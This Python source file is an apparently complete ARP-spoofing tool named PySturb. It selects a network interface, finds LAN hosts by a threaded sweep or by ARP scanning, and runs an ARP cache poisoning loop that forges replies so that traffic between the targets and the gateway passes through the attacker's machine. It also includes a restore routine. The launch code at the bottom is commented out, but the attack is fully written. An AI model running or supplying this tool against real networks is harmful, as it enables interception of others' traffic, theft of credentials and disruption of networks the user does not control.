# import psutil
import json
import inquirer
import socket
import netifaces
import scapy.all as scapy
import time
import signal
import sys
import inspect
import ipaddress
import threading
from queue import Queue

# Print prettified json
def jprint(args):
    print(json.dumps(args, indent=4, sort_keys=True))

def serialize_object(obj):
    instance_attributes = dict()
    serialized = vars(obj)
    for k in serialized:
        if "<class '__main__" in str(type((serialized[k]))): 
            ser = serialize_object(serialized[k])
            instance_attributes[k] = ser
        else: instance_attributes[k] = serialized[k]
    return instance_attributes


# Print pretiffied instance attributes
def pprint(args):
    jprint(serialize_object(args))

def vprint(args):
    print(vars(args))

class Address:
    def __init__(self, ip, mac):
        self.ip = ip
        self.mac = mac

class PySturb:
    def __init__(self):
        self.iface_list = self.get_iface_list()
        self.iface = None
        self.addr = None
        self.gateway = None
        self.targets = None
        self.interrupted = False

    # Display interface selection menu
    def prompt_select_iface(self):
        if not self.iface_list:
            print("No available network interface found!")
            return

        questions = [
            inquirer.List(
                "iface",
                message="Select network interface",
                choices=self.iface_list
            )
        ]
        iface = inquirer.prompt(questions)['iface']
        
        # Assign interface to global variable
        self.iface = iface
        
        # Get interface's addresses
        addrs = netifaces.ifaddresses(iface)

        # The interface seems not connected to any network, aborting...
        if not netifaces.AF_INET in addrs and not netifaces.AF_INET6 in addrs:
            return

        # Assign addresses to global variable
        ip = scapy.get_if_addr(iface)
        mac = scapy.get_if_hwaddr(iface)
        self.addr = Address(ip, mac)

        netmask = addrs[netifaces.AF_INET][0].get('netmask')
        self.cidr = sum(bin(int(x)).count('1') for x in netmask.split('.'))

        gateways = netifaces.gateways()[netifaces.AF_INET]
        gw_ip = [x[0] for x in gateways if x[1] == iface][0]
        gw_mac = scapy.getmacbyip(gw_ip)
        self.gateway = Address(gw_ip, gw_mac)

        self.prompt_scan_method()

        # Scan targets
        self.scan_targets()

    def prompt_scan_method(self):
        questions = [
            inquirer.List(
                "scan_method",
                message="Select scanning method",
                choices=["Network sweep", "ARP scan"]
            )
        ]
        self.scan_method = inquirer.prompt(questions)['scan_method']

    # Get available interfaces
    def get_iface_list(self):
        return [i for i in netifaces.interfaces() if i != 'lo']

    # Scan all hosts in the network regardless if they're exist or not (slow)
    def network_sweep(self):
        print(' [Network Sweep] Collecting targets...  (this perform may be slow)\n')
        hosts = list()
        global collected
        collected = 0
        network = self.addr.ip + '/' + str(self.cidr)
        # Get all possible ip address in network range
        ips = [str(x) for x in ipaddress.IPv4Network(network, strict=False)]
        # Remove network, broadcast, and gateway ip from the list
        ips.pop(0)
        ips.pop(-1)
        ips.remove(self.gateway.ip)

        # Create new thread queue
        q = Queue()

        # Create lock for progress and collected 
        print_lock = threading.Lock()

        # Worker method
        def scanner(ip):
            global collected

            print_lock.acquire()
            collected += 1
            sys.stdout.write("\r   Progress: {} of {}\t({:.1f}%)".format(collected, len(ips), collected/len(ips)*100))
            sys.stdout.flush()
            print_lock.release()

            mac = scapy.getmacbyip(ip)
            if mac:
                hosts.append(Address(ip, mac))

        def threader():
            while True:
                ip = q.get()
                scanner(ip)
                q.task_done()

        # Create thread pool
        for x in range(100):
            thread = threading.Thread(target=threader)
            thread.daemon = True
            thread.start()

        for ip in ips:
                q.put(ip)

        q.join()
        
        self.targets = hosts

    def arp_scan(self):
        print(' [ARP Scan] Collecting targets...  (Press CTRL+C to begin ARP poisoning)\n')
        ips=self.addr.ip + '/' + str(self.cidr)
        ret = []
        self.watch_interrupt_signal()
        while not self.interrupted:
            request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ips)
            ans, unans = scapy.srp(request, iface=self.iface, timeout=1, verbose=0)
            for send, recv in ans:
                if recv:
                    ip = recv[scapy.ARP].psrc
                    mac = recv[scapy.ARP].hwsrc
                    if ip != self.gateway.ip and not any(x.ip == ip for x in ret):
                        ret.append(Address(ip, mac))
                        print('\t[{}] MAC: {}\tIP: {}'.format(len(ret), mac, ip))
            time.sleep(0.5)

    def watch_interrupt_signal(self):
        global original_sigint
        self.interrupted = False
        original_sigint = signal.getsignal(signal.SIGINT)
        def handler(sig, frame):
            global original_sigint
            self.interrupted = True
            signal.signal(signal.SIGINT, original_sigint)
        signal.signal(signal.SIGINT, handler)

    def scan_targets(self):
        print(' [*] Please wait...')
        if self.scan_method == "Network sweep":
            self.network_sweep()
        elif self.scan_method == "ARP scan":
            self.arp_scan()


    # Send forged arp response
    def arp_spoof(self, target, host, verbose=True):
        # Forging arp response frame
        arp_response = scapy.ARP(pdst=target.ip, hwdst=target.mac, psrc=host.ip, hwsrc=host.mac, op='is-at')
        # Send the forged frame
        scapy.send(arp_response, verbose=0)
        # Print message
        if verbose:
            print(" [+] Packet sent to {} \t : {} is-at {}".format(target.ip, host.ip, host.mac))

    # Begin arp cache poisoning
    def begin_arp_cache_poisoning(self, verbose=True):
        # Loop with 1 second delay
        while True:
            # Iterating targets
            for target in self.targets:
                # Spoofing target mac address with our own address
                spoofed_target = Address(target.ip, self.addr.mac)
                spoofed_gateway = Address(self.gateway.ip, self.addr.mac)
                # Performing arp spoofing
                self.arp_spoof(target, spoofed_gateway, verbose)
                self.arp_spoof(self.gateway, spoofed_target, verbose)
            time.sleep(1)
            

    # Send legitimate arp response to restore the network
    def restore(self, verbose=True):
            for target in self.targets:
                self.arp_spoof(target, self.gateway, verbose)
                self.arp_spoof(self.gateway, target, verbose)


if __name__ == '__main__':
    worker = PySturb()
    worker.prompt_select_iface()

# try:
#    print('\n [*] Begin ARP cache poisoning...\n')
#    worker.begin_arp_cache_poisoning()
# except KeyboardInterrupt:
#    print('\n [*] Restoring network...\n')
#    worker.restore()
#pprint(worker)
